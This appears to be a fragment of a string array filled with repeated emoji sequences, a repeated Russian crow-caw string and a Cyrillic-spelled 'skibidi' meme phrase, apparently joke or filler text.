            "🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар🐦‍⬛🐦‍⬛кар",
            "😀😃😄😁😆😅🤣😂🙂🙃🫠😉😊😇🥰😍🤩😘😗☺️😚😙🥲😋😛😜🤪😝🤑🤗🤭🫢🫣🤫🤔🫡🤐🤨😐😑😶🫥😶‍🌫️😏😒🙄😬😮‍💨🤥🫨🙂‍↔️🙂‍↕️😌😔😪🤤😴😷🤒🤕🤢🤮🤧🥵🥶🥴😵😵‍💫🤯🤠🥳🥸😎🤓🧐😕🫤😟🙁☹️😮😯😲😳🥺🥹😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬😈👿💀☠️💩🤡👹👺👻👽👾🤖😺😸😹😻😼😽🙀😿😾🙈🙉🙊💋💯💢💥💫💦💨🕳️💤👋🤚🖐️✋🖖🫱🫲🫳🫴🫷🫸👌🤌🤏✌️🤞🫰🤟🤘🤙👈👉👆🖕👇☝️🫵👍👎✊👊🤛🤜👏🙌🫶👐🤲🤝🙏✍️💅🤳💪🦾🦿🦵🦶👂🦻👃🧠🫀🫁🦷🦴👀👁️👅👄🫦👶🧒👦👧🧑👱👨🧔🧔‍♂️🧔‍♀️👨‍🦰👨‍🦱👨‍🦳👨‍🦲👩👩‍🦰🧑‍🦰👩‍🦱🧑‍🦱👩‍🦳🧑‍🦳👩‍🦲🧑‍🦲👱‍♀️👱‍♂️🧓👴👵🙍🙍‍♂️🙍‍♀️🙎🙎‍♂️🙎‍♀️🙅🙅‍♂️🙅‍♀️🙆🙆‍♂️🙆‍♀️💁💁‍♂️💁‍♀️🙋🙋‍♂️🙋‍♀️🧏🧏‍♂️🧏‍♀️🙇🙇‍♂️🙇‍♀️🤦🤦‍♂️🤦‍♀️🤷🤷‍♂️🤷‍♀️🫅🤴👸👳👳‍♂️👳‍♀️👲🧕🤵👰🤰🤱👩‍🍼💃🕺🛀🛌👫💏👩‍❤️‍💋‍👨💑👩‍❤️‍👨💌💘💝💖💗💓💞💕💟❣️💔❤️‍🔥❤️‍🩹❤️🩷🧡💛💚💙🩵💜🤎🖤🩶🤍😀😃😄😁😆😅🤣😂🙂🙃🫠😉😊😇🥰😍🤩😘😗☺️😚😙🥲😋😛😜🤪😝🤑🤗🤭🫢🫣🤫🤔🫡🤐🤨😐😑😶🫥😶‍🌫️😏😒🙄😬😮‍💨🤥🫨🙂‍↔️🙂‍↕️😌😔😪🤤😴😷🤒🤕🤢🤮🤧🥵🥶🥴😵😵‍💫🤯🤠🥳🥸😎🤓🧐😕🫤😟🙁☹️😮😯😲😳🥺🥹😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬😈👿💀☠️💩🤡👹👺👻👽👾🤖😺😸😹😻😼😽🙀😿😾🙈🙉🙊💋💯💢💥💫💦💨🕳️💤👋🤚🖐️✋🖖🫱🫲🫳🫴🫷🫸👌🤌🤏✌️🤞🫰🤟🤘🤙👈👉👆🖕👇☝️🫵👍👎✊👊🤛🤜👏🙌🫶👐🤲🤝🙏✍️💅🤳💪🦾🦿🦵🦶👂🦻👃🧠🫀🫁🦷🦴👀👁️👅👄🫦👶🧒👦👧🧑👱👨🧔🧔‍♂️🧔‍♀️👨‍🦰👨‍🦱👨‍🦳👨‍🦲👩👩‍🦰🧑‍🦰👩‍🦱🧑‍🦱👩‍🦳🧑‍🦳👩‍🦲🧑‍🦲👱‍♀️👱‍♂️🧓👴👵🙍🙍‍♂️🙍‍♀️🙎🙎‍♂️🙎‍♀️🙅🙅‍♂️🙅‍♀️🙆🙆‍♂️🙆‍♀️💁💁‍♂️💁‍♀️🙋🙋‍♂️🙋‍♀️🧏🧏‍♂️🧏‍♀️🙇🙇‍♂️🙇‍♀️🤦🤦‍♂️🤦‍♀️🤷🤷‍♂️🤷‍♀️🫅🤴👸👳👳‍♂️👳‍♀️👲🧕🤵👰🤰🤱👩‍🍼💃🕺🛀🛌👫💏👩‍❤️‍💋‍👨💑👩‍❤️‍👨💌💘💝💖💗💓 😀😃😄😁😆😅🤣😂🙂🙃🫠😉😊😇🥰😍🤩😘😗☺️😚😙🥲😋😛😜🤪😝🤑🤗🤭🫢🫣🤫🤔🫡🤐🤨😐😑😶🫥😶‍🌫️😏😒🙄😬😮‍💨🤥🫨🙂‍↔️🙂‍↕️😌😔😪🤤😴😷🤒🤕🤢🤮🤧🥵🥶🥴😵😵‍💫🤯🤠🥳🥸😎🤓🧐😕🫤😟🙁☹️😮😯😲😳🥺🥹😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬😈👿💀☠️💩🤡👹👺👻👽👾🤖😺😸😹😻😼😽🙀😿😾🙈🙉🙊💋💯💢💥💫💦💨🕳️💤👋🤚🖐️✋🖖🫱🫲🫳🫴🫷🫸👌🤌🤏✌️🤞🫰🤟🤘🤙👈👉👆🖕👇☝️🫵👍👎✊👊🤛🤜👏🙌🫶👐🤲🤝🙏✍️💅🤳💪🦾🦿🦵🦶👂🦻👃🧠🫀🫁🦷🦴👀👁️👅👄🫦👶🧒👦👧🧑👱👨🧔🧔‍😀😃😄😁😆😅🤣😂🙂🙃🫠😉😊😇🥰😍🤩😘😗☺️😚😙🥲😋😛😜🤪😝🤑🤗🤭🫢🫣🤫🤔🫡🤐🤨😐😑😶🫥😶‍🌫️😏😒🙄😬😮‍💨🤥🫨🙂‍↔️🙂‍↕️😌😔😪🤤😴😷🤒🤕🤢🤮🤧🥵🥶🥴😵😵‍💫🤯🤠🥳🥸😎🤓🧐😕🫤😟🙁☹️😮😯😲😳🥺🥹😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠 😀😃😄😁😆😅🤣😂🙂🙃🫠😉😊😇🥰😍🤩😘😗☺️😚😙🥲😋😛😜🤪😝🤑🤗🤭🫢🫣🤫🤔🫡🤐🤨😐😑😶🫥😶‍🌫️😏😒🙄😬😮‍💨🤥🫨🙂‍↔️🙂‍↕️😌 😀😃😄😁😆😅🤣😂🙂🙃🫠😉😊😇🥰😍🤩😘😗☺️😚😙🥲😋😛😜🤪😝🤑🤗🤭🫢🫣😀😃😄😁😆😅🤣😂🙂🙃🫠😉😊😇🥰😍 😀😃😄😁😆😅🤣😂😀😃😄😁😀😃😀",
            "Бор щкибиди топ топ ес ес❤️🤑❤️😭😭❤️💋Бор щкибиди топ топ ес ес❤️🤑❤️😭😭❤️💋Бор щкибиди топ топ ес ес❤️🤑❤️😭😭❤️💋Бор щкибиди топ топ ес ес❤️🤑❤️😭😭❤️💋Бор щкибиди топ топ ес ес❤️🤑❤️😭😭❤️💋Бор щкибиди топ топ ес ес❤️🤑❤️😭😭❤️💋Бор щкибиди топ топ ес ес❤️🤑❤️😭😭❤️💋🧐😕🫤😟🙁☹️😮😯😲😳🥺🥹😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬😈👿💀☠️💩🤡👹👺👻👽👾🤖😺😸😹😻😼😽🙀😿😾🙈🙉🙊💋💯💢💥💫💦💨🕳️💤👋🤚🖐️✋🖖🫱🫲🫳🫴🫷🫸👌🤌🤏✌️🤞🫰🤟🤘🤙👈👉👆🖕👇☝️🫵👍👎✊👊🤛🤜👏🙌🫶👐🤲🤝🙏✍️💅🤳💪🦾🦿🦵🦶👂🦻👃🧠🫀🫁🦷🦴👀👁️👅👄🫦👶🧒👦👧🧑👱👨🧔🧔‍♂️🧔‍♀️👨‍🦰👨‍🦱👨‍🦳👨‍🦲👩👩‍🦰🧑‍🦰👩‍🦱🧑‍🦱👩‍🦳🧑‍🦳👩‍🦲🧑‍🦲👱‍♀️👱‍♂️🧓👴👵🙍🙍‍♂️🙍‍♀️🙎🙎‍♂️🙎‍♀️🙅🙅‍♂️🙅‍♀️🙆🙆‍♂️🙆‍♀️💁💁‍♂️💁‍♀️🙋🙋‍♂️🙋‍♀️🧏🧏‍♂️🧏‍♀️🙇🙇‍♂️🙇‍♀️🤦🤦‍♂️🤦‍♀️🤷🤷‍♂️🤷‍♀️🫅🤴👸👳👳‍♂️👳‍♀️👲🧕🤵👰🤰🤱👩‍🍼💃🕺🛀🛌👫💏👩‍❤️‍💋‍👨💑👩‍❤️‍👨💌💘💝💖💗💓💞💕💟❣️💔❤️‍🔥❤️‍🩹❤️🩷🧡💛💚💙🩵💜🤎🖤🩶🤍😀😃😄😁😆😅🤣😂🙂🙃🫠😉😊😇🥰😍🤩😘😗☺️😚😙🥲😋😛😜🤪😝🤑🤗🤭🫢🫣🤫🤔🫡🤐🤨😐😑😶🫥😶‍🌫️😏😒🙄😬😮‍💨🤥🫨🙂‍↔️🙂‍↕️😌😔😪🤤😴😷🤒🤕🤢🤮🤧🥵🥶🥴😵😵‍💫🤯🤠🥳🥸😎🤓🧐😕🫤😟🙁☹️😮😯😲😳🥺🥹😦😧😨😰😥😢 🧐😕🫤😟🙁☹️😮😯😲😳🥺🥹😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬😈👿💀☠️💩🤡👹👺👻👽👾🤖😺😸😹😻😼😽🙀😿😾🙈🙉🙊💋💯💢💥💫💦💨🕳️💤👋🤚🖐️✋🖖🫱🫲🫳🫴🫷🫸👌🤌🤏✌️🤞🫰🤟🤘🤙👈👉👆🖕👇☝️🫵👍👎✊👊🤛🤜👏🙌🫶👐🤲🤝🙏✍️💅🤳💪🦾🦿🦵🦶👂🦻👃🧠🫀🫁🦷🦴👀👁️👅👄🫦👶🧒👦👧🧑👱👨🧔🧔‍♂️🧔‍♀️👨‍🦰👨‍🦱👨‍🦳👨‍🦲👩👩‍🦰🧑‍🦰👩‍🦱🧑‍🦱👩‍🦳🧑‍🦳👩‍🦲🧑‍🦲👱‍♀️👱‍♂️🧓👴👵🙍🙍‍♂️🙍‍♀️🙎🙎‍♂️🙎‍♀️🙅🙅‍♂️🙅‍♀️🙆🙆‍♂️🙆‍♀️💁💁‍♂️💁‍♀️🙋🙋‍♂️🙋‍♀️🧏🧏‍♂️🧏‍♀️🙇🙇‍♂️🙇‍♀️🤦🤦‍♂️🤦‍♀️🤷🤷‍♂️🤷‍♀️🫅🧐😕🫤😟🙁☹️😮😯😲😳🥺🥹😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬😈👿💀☠️💩🤡👹👺👻👽👾🤖😺😸😹😻😼😽🙀😿😾🙈🙉🙊💋💯💢💥💫💦💨🕳️💤👋🤚🖐️✋🖖🫱🫲🫳🫴🫷🫸👌🤌🤏✌️🤞🫰🤟🤘🤙👈👉👆🖕👇☝️🫵👍👎✊👊🤛🤜👏🙌🫶👐🤲🤝🙏✍️💅🤳💪🦾🦿🦵🦶👂🦻👃🧠🫀🫁🦷🦴👀👁️👅👄🫦👶🧒👦👧🧑👱👨🧔🧔‍♂️🧔‍♀️👨‍🦰👨‍🦱👨‍🦳 🧐😕🫤😟🙁☹️😮😯😲😳🥺🥹😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬😈👿💀☠️💩🤡👹👺👻👽👾🤖😺😸😹😻😼😽🙀😿😾🙈🙉🙊💋💯💢💥💫💦💨🕳️💤👋🤚🖐️✋🖖🫱🫲🫳🫴🫷🫸👌 🧐😕🫤😟🙁☹️😮😯😲😳🥺Бор щкибиди топ топ ес ес❤️🤑❤️😭😭❤️Бор щ💋Бор щкибиди топ топ ес ес❤️🤑❤️😭",
            "🏧🚮🚰♿🚹🚺🚻🚼🚾🛂🛃🛄🛅🗣️👤👥🫂👣⚠️🚸⛔🚫🚳🚭🚯🚱🚷📵🔞☢️☣️⬆️↗️➡️↘️⬇️↙️⬅️↖️↕️↔️↩️↪️⤴️⤵️🔃🔄🔙🔚🔛🔜🔝🛐⚛️🕉️✡️☸️☯️✝️☦️☪️☮️🕎🔯🪯♈♉♊♋♌♍♎♏♐♑♒♓⛎🔀🔁🔂▶️⏩⏭️⏯️◀️⏪⏮️🔼⏫🔽⏬⏸️⏹️⏺️⏏️🎦🔅🔆📶🛜📳📴♀️♂️⚧️✖️➕➖➗🟰♾️‼️⁉️❓❔❕❗〰️💱💲⚕️♻️⚜️🔱📛🔰⭕✅☑️✔️❌❎➰➿〽️✳️✴️❇️©️®️™️#️⃣*️⃣0️⃣1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣8️⃣9️⃣🔟🔠🔡🔢🔣🔤🅰️🆎🅱️🆑🆒🆓ℹ️🆔Ⓜ️🆕🆖🅾️🆗🅿️🆘🆙🆚🈁🈂️🈷️🈶🈯🉐🈹🈚🈲🉑🈸🈴🈳㊗️㊙️🈺🈵🔴🟠🟡🟢🔵🟣🟤⚫⚪🟥🟧🟨🟩🟦🟪🟫⬛⬜◼️◻️◾◽▪️▫️🔶🔷🔸🔹🔺🔻💠🔘🔳🔲💬👁️‍🗨️🗨️🗯️💭👨‍👩‍👦👨‍👩‍👧👨‍👩‍👧‍👦👨‍👩‍👦‍👦👨‍👩‍👧‍👧👨‍👦👨‍👦‍👦👨‍👧👨‍👧‍👦👨‍👧‍👧👩‍👦👩‍👦‍👦👩‍👧👩‍👧‍👦👩‍👧‍👧👪🧑‍🧑‍🧒🧑‍🧑‍🧒‍🧒🧑‍🧒🧑‍🧒‍🧒🏧🚮🚰♿🚹🚺🚻🚼🚾🛂🛃🛄🛅🗣️👤👥🫂👣⚠️🚸⛔🚫🚳🚭🚯🚱🚷📵🔞☢️☣️⬆️↗️➡️↘️⬇️↙️⬅️↖️↕️↔️↩️↪️⤴️⤵️🔃🔄🔙🔚🔛🔜🔝🛐⚛️🕉️✡️☸️☯️✝️☦️☪️☮️🕎🔯🪯♈♉♊♋♌♍♎♏♐♑♒♓⛎🔀🔁🔂▶️⏩⏭️⏯️◀️⏪⏮️🔼⏫🔽⏬⏸️⏹️⏺️⏏️🎦🔅🔆📶🛜📳📴♀️♂️⚧️✖️➕➖➗🟰♾️‼️⁉️❓❔❕❗〰️💱💲⚕️♻️⚜️🔱📛🔰⭕✅☑️✔️❌❎➰➿〽️✳️✴️❇️©️®️™️#️⃣*️⃣0️⃣1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣8️⃣9️⃣🔟🔠🔡🔢🔣🔤🅰️🆎🅱️🆑🆒🆓ℹ️🆔Ⓜ️🆕🆖🅾️🆗🅿️🆘🆙🆚🈁🈂️🈷️🈶🈯🉐🈹🈚🈲🉑🈸🈴🈳㊗️㊙️🈺🈵🔴🟠🟡🟢🔵🟣🟤⚫⚪🟥🟧🟨🟩🟦🟪🟫⬛⬜◼️◻️◾◽▪️▫️🔶🔷🔸🔹🔺🔻💠🔘🔳🔲💬👁️‍🗨️🗨️🗯️💭👨‍👩‍👦👨‍👩‍👧👨‍👩‍👧‍👦👨‍👩‍👦‍👦👨‍👩‍👧‍👧👨‍👦👨‍👦‍👦👨‍👧👨‍👧‍👦👨‍👧‍👧👩‍👦👩‍👦‍👦👩‍👧👩‍👧‍👦👩‍👧‍👧👪🧑‍🧑‍🧒🧑‍🧑‍🧒‍🧒🧑‍🧒🧑‍🧒‍🧒🏧🚮🚰♿🚹🚺🚻🚼🚾🛂🛃🛄🛅🗣️👤👥🫂👣⚠️🚸⛔🚫🚳🚭🚯🚱🚷📵🔞☢️☣️⬆️↗️➡️↘️⬇️↙️⬅️↖️↕️↔️↩️↪️⤴️⤵️🔃🔄🔙🔚🔛🔜🔝🛐⚛️🕉️✡️☸️☯️✝️☦️☪️☮️🕎🔯🪯♈♉♊♋♌♍♎♏♐♑♒♓⛎🔀🔁🔂▶️⏩⏭️⏯️◀️⏪⏮️🔼⏫🔽⏬⏸️⏹️⏺️⏏️🎦🔅🔆📶🛜📳📴♀️♂️⚧️✖️➕➖➗🟰♾️‼️⁉️❓❔❕❗〰️💱💲⚕️♻️⚜️🔱📛🔰⭕✅☑️✔️❌❎➰➿〽️✳️✴️❇️©️®️™️#️⃣*️⃣0️⃣1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣8️⃣9️⃣🔟🔠🔡🔢🔣🔤🅰️🆎🅱️🆑🆒🆓ℹ️🆔Ⓜ️🆕🆖🅾️🆗🅿️🆘🆙🆚🈁🈂️🈷️🈶🈯🉐🈹🈚🈲🉑🈸🈴🈳㊗️㊙️🈺🈵🔴🟠🟡🟢🔵🟣🟤⚫⚪🟥🟧🟨🟩🟦🟪🟫⬛⬜◼️◻️◾◽▪️▫️🔶🔷🔸🔹🔺🔻💠🔘🔳🔲💬👁️‍🗨️🗨️🗯️💭👨‍👩‍👦👨‍👩‍👧👨‍👩‍👧‍👦👨‍👩‍👦‍👦👨‍👩‍👧‍👧👨‍👦👨‍👦‍👦 🏧🚮🚰♿🚹🚺🚻🚼🚾🛂🛃🛄🛅🗣️👤👥🫂👣⚠️🚸⛔🚫🚳🚭🚯🚱🚷📵🔞☢️☣️⬆️↗️➡️↘️⬇️↙️⬅️↖️↕️↔️↩️↪️⤴️⤵️🔃🔄🔙🔚🔛🔜🔝🛐⚛️🕉️✡️☸️☯️✝️☦️☪️☮️🕎🔯🪯♈♉♊♋♌♍♎♏♐♑♒♓⛎🔀🔁🔂▶️⏩⏭️⏯️◀️⏪⏮️🔼⏫🔽⏬⏸️⏹️⏺️⏏️🎦🔅🔆📶🛜📳📴♀️♂️⚧️✖️➕➖➗🟰♾️‼️⁉️❓❔❕❗〰️💱💲⚕️♻️⚜️🔱📛🔰⭕✅☑️✔️❌❎➰➿〽️✳️✴️❇️©️®️™️#️⃣*️⃣0️⃣1️⃣2️⃣3️⃣4️⃣5️🏧🚮🚰♿🚹🚺🚻🚼🚾🛂🛃🛄🛅🗣️👤👥🫂👣⚠️🚸⛔🚫🚳🚭🚯🚱🚷📵🔞☢️☣️⬆️↗️➡️↘️⬇️↙️⬅️↖️↕️↔️↩️↪️⤴️⤵️🔃🔄🔙🔚🔛🔜🔝🛐⚛️🕉️✡️☸️☯️✝️☦️☪️☮️🕎🏧🚮🚰♿🚹🚺🚻🚼🚾🛂🛃🛄🛅🗣️👤👥🫂👣⚠️🚸⛔🚫🚳🚭🚯🚱🚷📵🔞☢️☣️⬆️🏧🚮🚰♿🚹🚺🚻🚼🚾🛂🛃🛄🛅🗣️👤 🏧🚮🚰♿🚹🚺🚻🚼🏧🚮🚰♿🏧  ",
            "👓🕶️🥽🥼🦺👔👕👖🧣🧤🧥🧦👗👘🥻🩱🩲🩳👙👚🪭👛👜👝🛍️🎒🩴👞👟🥾🥿👠👡🩰👢🪮👑👒🎩🎓🧢🪖⛑️📿💄💍💎🔇🔈🔉🔊📢📣📯🔔🔕🎼🎵🎶🎙️🎚️🎛️🎤🎧📻🎷🪗🎸🎹🎺🎻🪕🥁🪘🪇🪈📱📲☎️📞📟📠🔋🪫🔌💻🖥️🖨️⌨️🖱️🖲️💽💾💿📀🧮🎥🎞️📽️🎬📺📷📸📹📼🔍🔎🕯️💡🔦🏮🪔📔📕📖📗📘📙📚📓📒📃📜📄📰🗞️📑🔖🏷️💰🪙💴💵💶💷💸💳🧾💹✉️📧📨📩📤📥📦📫📪📬📭📮🗳️✏️✒️🖋️🖊️🖌️🖍️📝💼📁📂🗂️📅📆🗒️🗓️📇📈📉📊📋📌📍📎🖇️📏📐✂️🗃️🗄️🗑️🔒🔓🔏🔐🔑🗝️🔨🪓⛏️⚒️🛠️🗡️⚔️💣🪃🏹🛡️🪚🔧🪛🔩⚙️🗜️⚖️🦯🔗⛓️‍💥⛓️🪝🧰🧲🪜⚗️🧪🧫🧬🔬🔭📡💉🩸💊🩹🩼🩺🩻🚪🛗🪞🪟🛏️🛋️🪑🚽🪠🚿🛁🪤🪒🧴🧷🧹🧺🧻🪣🧼🫧🪥🧽🧯🛒🚬⚰️🪦⚱️🧿🪬🗿🪧🪪👓🕶️🥽🥼🦺👔👕👖🧣🧤🧥🧦👗👘🥻🩱🩲🩳👙👚🪭👛👜👝🛍️🎒🩴👞👟🥾🥿👠👡🩰👢🪮👑👒🎩🎓🧢🪖⛑️📿💄💍💎🔇🔈🔉🔊📢📣📯🔔🔕🎼🎵🎶🎙️🎚️🎛️🎤🎧📻🎷🪗🎸🎹🎺🎻🪕🥁🪘🪇🪈📱📲☎️📞📟📠🔋🪫🔌💻🖥️🖨️⌨️🖱️🖲️💽💾💿📀🧮🎥🎞️📽️🎬📺📷📸📹📼🔍🔎🕯️💡🔦🏮🪔📔📕📖📗📘📙📚📓📒📃📜📄📰🗞️📑🔖🏷️💰🪙💴💵💶💷💸💳🧾💹✉️📧📨📩📤📥📦📫📪📬📭📮🗳️✏️✒️🖋️🖊️🖌️🖍️📝💼📁📂🗂️📅📆🗒️🗓️📇📈📉📊📋📌📍📎🖇️📏📐✂️🗃️🗄️🗑️🔒🔓🔏🔐🔑🗝️🔨🪓⛏️⚒️🛠️🗡️⚔️💣🪃🏹🛡️🪚🔧🪛🔩⚙️🗜️⚖️🦯🔗⛓️‍💥⛓️🪝🧰🧲🪜⚗️🧪🧫🧬🔬🔭📡💉🩸💊🩹🩼🩺🩻🚪🛗🪞🪟🛏️🛋️🪑🚽🪠🚿🛁🪤🪒🧴🧷🧹🧺🧻🪣🧼🫧🪥🧽🧯🛒🚬⚰️🪦⚱️🧿🪬🗿🪧🪪👓🕶️🥽🥼🦺👔👕👖🧣🧤🧥🧦👗👘🥻🩱🩲🩳👙👚🪭👛👜👝🛍️🎒🩴👞👟🥾🥿👠👡🩰👢🪮👑👒🎩🎓🧢🪖⛑️📿💄💍💎🔇🔈🔉🔊📢📣📯🔔🔕🎼🎵🎶🎙️🎚️🎛️🎤🎧📻🎷🪗🎸🎹🎺🎻🪕🥁🪘🪇🪈📱📲☎️📞📟📠🔋🪫🔌💻🖥️🖨️⌨️🖱️🖲️💽💾💿📀🧮🎥🎞️📽️🎬📺📷📸📹📼🔍🔎🕯️💡🔦🏮🪔📔📕📖📗📘📙📚📓📒📃📜📄📰🗞️📑🔖🏷️💰🪙💴💵💶💷💸💳🧾💹✉️📧📨📩📤📥📦📫📪📬📭📮🗳️✏️✒️🖋️🖊️🖌️🖍️📝💼📁📂🗂️📅📆🗒️🗓️📇📈📉📊📋📌📍📎🖇️📏📐✂️🗃️🗄️🗑️🔒🔓🔏🔐🔑🗝️🔨🪓⛏️⚒️🛠️🗡️⚔️💣🪃🏹🛡️🪚🔧🪛🔩⚙️🗜️⚖️🦯🔗⛓️‍💥⛓️🪝🧰🧲🪜⚗️🧪🧫🧬🔬🔭📡💉🩸💊🩹🩼🩺🩻🚪🛗🪞🪟🛏️🛋️🪑🚽🪠🚿🛁🪤🪒🧴🧷🧹🧺